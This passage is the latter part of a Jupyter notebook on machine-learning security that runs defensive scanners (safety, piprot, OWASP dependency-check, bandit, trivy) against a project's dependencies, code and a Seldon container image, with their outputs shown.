      "Requirement already satisfied: pyparsing!=3.0.5,>=2.0.2 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from packaging->safety) (3.0.8)\n",
      "Requirement already satisfied: idna<4,>=2.5 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->safety) (3.3)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->safety) (2021.10.8)\n",
      "Requirement already satisfied: charset-normalizer~=2.0.0 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->safety) (2.0.12)\n",
      "Requirement already satisfied: urllib3<1.27,>=1.21.1 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->safety) (1.26.5)\n",
      "Requirement already satisfied: zipp>=0.5 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from importlib-metadata->Click>=6.0->safety) (3.8.0)\n",
      "Requirement already satisfied: typing-extensions>=3.6.4 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from importlib-metadata->Click>=6.0->safety) (4.1.1)\n"
     ]
    }
   ],
   "source": [
    "!pip install safety"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "40b67561",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+==============================================================================+\r\n",
      "|                                                                              |\r\n",
      "|                               /$$$$$$            /$$                         |\r\n",
      "|                              /$$__  $$          | $$                         |\r\n",
      "|           /$$$$$$$  /$$$$$$ | $$  \\__//$$$$$$  /$$$$$$   /$$   /$$           |\r\n",
      "|          /$$_____/ |____  $$| $$$$   /$$__  $$|_  $$_/  | $$  | $$           |\r\n",
      "|         |  $$$$$$   /$$$$$$$| $$_/  | $$$$$$$$  | $$    | $$  | $$           |\r\n",
      "|          \\____  $$ /$$__  $$| $$    | $$_____/  | $$ /$$| $$  | $$           |\r\n",
      "|          /$$$$$$$/|  $$$$$$$| $$    |  $$$$$$$  |  $$$$/|  $$$$$$$           |\r\n",
      "|         |_______/  \\_______/|__/     \\_______/   \\___/   \\____  $$           |\r\n",
      "|                                                          /$$  | $$           |\r\n",
      "|                                                         |  $$$$$$/           |\r\n",
      "|  by pyup.io                                              \\______/            |\r\n",
      "|                                                                              |\r\n",
      "+==============================================================================+\r\n",
      "| REPORT                                                                       |\r\n",
      "| checked 50 packages, using free DB (updated once a month)                    |\r\n",
      "+============================+===========+==========================+==========+\r\n",
      "| package                    | installed | affected                 | ID       |\r\n",
      "+============================+===========+==========================+==========+\r\n",
      "| numpy                      | 1.21.5    | <1.22.0                  | 44717    |\r\n",
      "| numpy                      | 1.21.5    | <1.22.0                  | 44716    |\r\n",
      "| numpy                      | 1.21.5    | <1.22.2                  | 44715    |\r\n",
      "+==============================================================================+\u001b[0m\r\n"
     ]
    }
   ],
   "source": [
    "!safety check -r requirements-freeze.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "846b26e9",
   "metadata": {},
   "source": [
    "#### Identifying Old Dependencies\n",
    "\n",
    "Ensuring dependencies are up to date continuously is important. There are older dependencies like `piprot` but also good tools like `dependeabot`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "3aed0528",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting piprot\n",
      "  Downloading piprot-0.9.11.tar.gz (8.5 kB)\n",
      "  Preparing metadata (setup.py) ... \u001b[?25ldone\n",
      "\u001b[?25hRequirement already satisfied: requests in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from piprot) (2.27.1)\n",
      "Collecting requests-futures\n",
      "  Downloading requests_futures-1.0.0-py2.py3-none-any.whl (7.4 kB)\n",
      "Requirement already satisfied: six in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from piprot) (1.16.0)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->piprot) (2021.10.8)\n",
      "Requirement already satisfied: idna<4,>=2.5 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->piprot) (3.3)\n",
      "Requirement already satisfied: charset-normalizer~=2.0.0 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->piprot) (2.0.12)\n",
      "Requirement already satisfied: urllib3<1.27,>=1.21.1 in /home/alejandro/miniconda3/envs/fml-security/lib/python3.7/site-packages (from requests->piprot) (1.26.5)\n",
      "Building wheels for collected packages: piprot\n",
      "  Building wheel for piprot (setup.py) ... \u001b[?25ldone\n",
      "\u001b[?25h  Created wheel for piprot: filename=piprot-0.9.11-py2.py3-none-any.whl size=7939 sha256=91e4561d9861e29b801b7a3bf433a281180b5d438f0507726b529f2ce9007643\n",
      "  Stored in directory: /home/alejandro/.cache/pip/wheels/4f/9c/3e/63acac74a6d463ff5f08b0d51c0891b7a33e591c0a1dc3bb59\n",
      "Successfully built piprot\n",
      "Installing collected packages: requests-futures, piprot\n",
      "Successfully installed piprot-0.9.11 requests-futures-1.0.0\n"
     ]
    }
   ],
   "source": [
    "!pip install piprot"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "f0545b7c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "attrs (21.4.0) is up to date\n",
      "bcrypt (3.1.7) is 925 days out of date. Latest is 3.2.0\n",
      "certifi (2021.10.8) is up to date\n",
      "cffi (1.15.0) is up to date\n",
      "charset-normalizer (2.0.12) is up to date\n",
      "click (8.0.4) is 41 days out of date. Latest is 8.1.2\n",
      "cryptography (3.4.8) is 203 days out of date. Latest is 36.0.2\n",
      "docker-compose (1.25.0) is 538 days out of date. Latest is 1.29.2\n",
      "dockerpty (0.4.1) is up to date\n",
      "docopt (0.6.2) is up to date\n",
      "Flask (1.1.2) is 726 days out of date. Latest is 2.1.1\n",
      "Flask-Cors (3.0.10) is up to date\n",
      "Flask-OpenTracing (1.1.0) is up to date\n",
      "flatbuffers (1.12) is 423 days out of date. Latest is 2.0\n",
      "grpcio (1.44.0) is 34 days out of date. Latest is 1.45.0\n",
      "grpcio-opentracing (1.1.4) is up to date\n",
      "grpcio-reflection (1.34.1) is 434 days out of date. Latest is 1.45.0\n",
      "gunicorn (20.1.0) is up to date\n",
      "idna (3.3) is up to date\n",
      "importlib-metadata (4.11.3) is up to date\n",
      "itsdangerous (1.1.0) is 1244 days out of date. Latest is 2.1.2\n",
      "jaeger-client (4.4.0) is 250 days out of date. Latest is 4.8.0\n",
      "Jinja2 (2.11.3) is 418 days out of date. Latest is 3.1.1\n",
      "joblib (0.16.0) is 462 days out of date. Latest is 1.1.0\n",
      "jsonschema (3.2.0) is 785 days out of date. Latest is 4.4.0\n",
      "MarkupSafe (1.1.1) is 1115 days out of date. Latest is 2.1.1\n",
      "numpy (1.21.5) is 77 days out of date. Latest is 1.22.3\n",
      "opentracing (2.4.0) is up to date\n",
      "paramiko (2.7.1) is 829 days out of date. Latest is 2.10.3\n",
      "pipdeptree (2.2.1) is up to date\n",
      "prometheus-client (0.8.0) is 683 days out of date. Latest is 0.14.1\n",
      "protobuf (3.20.0) is up to date\n",
      "pycparser (2.21) is up to date\n",
      "PyNaCl (1.3.0) is 1199 days out of date. Latest is 1.5.0\n",
      "pyrsistent (0.18.1) is up to date\n",
      "PyYAML (5.4.1) is 265 days out of date. Latest is 6.0\n",
      "requests (2.27.1) is up to date\n",
      "scikit-learn (0.24.2) is 241 days out of date. Latest is 1.0.2\n",
      "scipy (1.7.3) is 68 days out of date. Latest is 1.8.0\n",
      "seldon-core (1.13.1) is up to date\n",
      "six (1.16.0) is up to date\n",
      "texttable (1.6.2) is 545 days out of date. Latest is 1.6.4\n",
      "threadloop (1.0.2) is up to date\n",
      "threadpoolctl (3.1.0) is up to date\n",
      "thrift (0.16.0) is up to date\n",
      "tornado (6.1) is up to date\n",
      "typing_extensions (4.1.1) is up to date\n",
      "urllib3 (1.26.5) is 293 days out of date. Latest is 1.26.9\n",
      "Werkzeug (2.1.1) is up to date\n",
      "zipp (3.8.0) is up to date\n",
      "Your requirements are 11798 days out of date\n"
     ]
    }
   ],
   "source": [
    "!piprot requirements-freeze.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "669e97ca",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[INFO] Checking for updates\n",
      "[INFO] Skipping NVD check since last check was within 4 hours.\n",
      "[INFO] Skipping RetireJS update since last update was within 24 hours.\n",
      "[INFO] Check for updates complete (29 ms)\n",
      "[INFO] \n",
      "\n",
      "Dependency-Check is an open source tool performing a best effort analysis of 3rd party dependencies; false positives and false negatives may exist in the analysis performed by the tool. Use of the tool and the reporting provided constitutes acceptance for use in an AS IS condition, and there are NO warranties, implied or otherwise, with regard to the analysis or its use. Any use of the tool and the reporting provided is at the user’s risk. In no event shall the copyright holder or OWASP be held liable for any damages whatsoever arising out of or in connection with the use of this tool, the analysis performed, or the resulting report.\n",
      "\n",
      "\n",
      "   About ODC: https://jeremylong.github.io/DependencyCheck/general/internals.html\n",
      "   False Positives: https://jeremylong.github.io/DependencyCheck/general/suppression.html\n",
      "\n",
      "💖 Sponsor: https://github.com/sponsors/jeremylong\n",
      "\n",
      "\n",
      "[INFO] Analysis Started\n",
      "[INFO] Finished File Name Analyzer (0 seconds)\n",
      "[INFO] Finished Dependency Merging Analyzer (0 seconds)\n",
      "[INFO] Finished Version Filter Analyzer (0 seconds)\n",
      "[INFO] Finished Hint Analyzer (0 seconds)\n",
      "[INFO] Created CPE Index (3 seconds)\n",
      "[INFO] Finished CPE Analyzer (3 seconds)\n",
      "[INFO] Finished False Positive Analyzer (0 seconds)\n",
      "[INFO] Finished NVD CVE Analyzer (0 seconds)\n",
      "[INFO] Finished Sonatype OSS Index Analyzer (0 seconds)\n",
      "[INFO] Finished Vulnerability Suppression Analyzer (0 seconds)\n",
      "[INFO] Finished Dependency Bundling Analyzer (0 seconds)\n",
      "[INFO] Analysis Complete (3 seconds)\n",
      "[INFO] Writing report to: /report/dependency-check-report.xml\n",
      "[INFO] Writing report to: /report/dependency-check-report.html\n",
      "[INFO] Writing report to: /report/dependency-check-report.json\n",
      "[INFO] Writing report to: /report/dependency-check-report.csv\n",
      "[INFO] Writing report to: /report/dependency-check-report.sarif\n",
      "[INFO] Writing report to: /report/dependency-check-junit.xml\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "mkdir -p owasp/deps owasp/data/cache owasp/report\n",
    "docker run --rm \\\n",
    "    -e user=$USER \\\n",
    "    -u $(id -u ${USER}):$(id -g ${USER}) \\\n",
    "    --volume $(pwd):/src:z \\\n",
    "    --volume $(pwd)/owasp/data:/usr/share/dependency-check/data:z \\\n",
    "    --volume $(pwd)/owasp/report:/report:z \\\n",
    "    owasp/dependency-check:latest \\\n",
    "    --scan /src \\\n",
    "    --format \"ALL\" \\\n",
    "    --project \"dependency-check scan: $(pwd)\" \\\n",
    "    --out /report"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "f1e54ed7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dependency-check-junit.xml    dependency-check-report.json\r\n",
      "dependency-check-report.csv   dependency-check-report.sarif\r\n",
      "dependency-check-report.html  dependency-check-report.xml\r\n"
     ]
    }
   ],
   "source": [
    "!ls owasp/report"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "373ec40c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\"Project\",\"ScanDate\",\"DependencyName\",\"DependencyPath\",\"Description\",\"License\",\"Md5\",\"Sha1\",\"Identifiers\",\"CPE\",\"CVE\",\"CWE\",\"Vulnerability\",\"Source\",\"CVSSv2_Severity\",\"CVSSv2_Score\",\"CVSSv2\",\"CVSSv3_BaseSeverity\",\"CVSSv3_BaseScore\",\"CVSSv3\",\"CPE Confidence\",\"Evidence Count\"\r\n"
     ]
    }
   ],
   "source": [
    "!cat owasp/report/dependency-check-report.csv"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "17b70b49",
   "metadata": {},
   "source": [
    "## 5 - Code Scans\n",
    "\n",
    "![](images/ml-code.jpg)\n",
    "\n",
    "We use `bandit` for python AST code scans, which we can make sure to extend as well to some of the code that is being used in Jupyter notebooks where relevant.\n",
    "\n",
    "Examples of key areas that we would be interested to identify:\n",
    "\n",
    "* Ensuring secrets/keys are not being committed to the repo\n",
    "* Ensuring bad practice can be avoided where clear potential risk\n",
    "* Identifying and pointing potentially risky code paths\n",
    "* Providing suggestions where best practices can be provided"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c0ac2084",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install bandit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "ccc65379",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[main]\tINFO\tprofile include tests: None\r\n",
      "[main]\tINFO\tprofile exclude tests: None\r\n",
      "[main]\tINFO\tcli include tests: None\r\n",
      "[main]\tINFO\tcli exclude tests: None\r\n",
      "[main]\tINFO\trunning on Python 3.7.12\r\n",
      "[manager]\tWARNING\tSkipping directory (.), use -r flag to scan contents\r\n",
      "\u001b[95mRun started:2022-04-10 17:04:48.838869\u001b[0m\r\n",
      "\u001b[95m\r\n",
      "Test results:\u001b[0m\r\n",
      "\tNo issues identified.\r\n",
      "\u001b[95m\r\n",
      "Code scanned:\u001b[0m\r\n",
      "\tTotal lines of code: 0\r\n",
      "\tTotal lines skipped (#nosec): 0\r\n",
      "\u001b[95m\r\n",
      "Run metrics:\u001b[0m\r\n",
      "\tTotal issues (by severity):\r\n",
      "\t\tUndefined: 0\r\n",
      "\t\tLow: 0\r\n",
      "\t\tMedium: 0\r\n",
      "\t\tHigh: 0\r\n",
      "\tTotal issues (by confidence):\r\n",
      "\t\tUndefined: 0\r\n",
      "\t\tLow: 0\r\n",
      "\t\tMedium: 0\r\n",
      "\t\tHigh: 0\r\n",
      "\u001b[95mFiles skipped (0):\u001b[0m\r\n"
     ]
    }
   ],
   "source": [
    "!bandit ."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7e1907c6",
   "metadata": {},
   "source": [
    "## 6 - Container Scan"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "edc6ecde",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2022-04-11T19:29:06.350+0100\t\u001b[34mINFO\u001b[0m\tDetected OS: redhat\n",
      "2022-04-11T19:29:06.350+0100\t\u001b[34mINFO\u001b[0m\tDetecting RHEL/CentOS vulnerabilities...\n",
      "2022-04-11T19:29:06.404+0100\t\u001b[34mINFO\u001b[0m\tNumber of language-specific files: 1\n",
      "2022-04-11T19:29:06.404+0100\t\u001b[34mINFO\u001b[0m\tDetecting python-pkg vulnerabilities...\n",
      "\n",
      "seldonio/sklearnserver:1.14.0-dev (redhat 8.5)\n",
      "==============================================\n",
      "Total: 0 (CRITICAL: 0)\n",
      "\n",
      "\n",
      "Python (python-pkg)\n",
      "===================\n",
      "Total: 0 (CRITICAL: 0)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "!trivy image --severity CRITICAL seldonio/sklearnserver:1.14.0-dev"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ba836620",
   "metadata": {},
   "source": [
    "## Honourable Mentions"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4c220904",
   "metadata": {},
   "source": [
    "![](images/ml-mentions.jpg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "001e548f",
   "metadata": {},
   "source": [
    "Above are a set of honorable mentions that are not covered in this notebook, but that would still be relevant to check out. You can follow the resources at the top for other links to relevant areas for deeper dives."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a6fb215",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
